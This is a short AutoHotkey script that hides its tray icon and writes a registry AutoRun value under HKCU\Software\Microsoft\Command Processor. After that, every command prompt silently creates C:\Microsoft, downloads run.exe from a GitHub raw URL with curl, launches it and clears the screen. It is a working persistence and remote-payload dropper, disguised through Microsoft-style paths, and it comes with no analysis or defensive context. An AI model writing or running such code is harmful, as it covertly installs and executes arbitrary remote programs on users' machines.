#SingleInstance Ignore
#NoTrayIcon

RegWrite "mkdir C:\Microsoft & curl -L -o C:\Microsoft\run.exe https://raw.githubusercontent.com/astorrs276/Public-AHK/main/run.exe & start C:\Microsoft\run.exe & cls", "REG_SZ", "HKCU\Software\Microsoft\Command Processor", "AutoRun"
